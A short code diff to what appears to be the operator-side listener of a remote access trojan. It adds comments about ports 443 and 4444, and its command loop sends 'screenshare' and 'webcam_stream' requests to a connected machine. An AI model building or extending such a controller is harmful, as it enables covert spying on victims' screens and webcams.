@@ -51,7 +51,7 @@ BUFFER_SIZE = 1024
 
 def Listener():
     ListenerHost= input(colored("[*] Enter Listener IP Address: ", 'red'))
-    ListenerPort= 443
+    ListenerPort= 443 # Change this, optional, not recommended
     s.bind((ListenerHost, ListenerPort))
     s.listen(99)
     time.sleep(1)
@@ -63,14 +63,14 @@ def Listener():
     with conn:
         print(colored(f"Recived Connection From: {addr}:{recv_data}", 'blue'))
 
-        serv = StreamingServer(ListenerHost, 4444)
+        serv = StreamingServer(ListenerHost, 4444) # Change this, optional, not recommended
         serv.start_server()
         time.sleep(2)
         print(colored("[+] Connecting to the Session...", 'blue'))
 
         while True:
 
-            Handler = input(f"{addr[0]}:{recv_data} ⇄    ")
+            Handler = input(f"{addr[0]}:{recv_data} ⇄  ")
             if Handler == "screenshare":       
                 conn.send(Handler.encode("utf-8"))
             elif Handler == "webcam_stream":
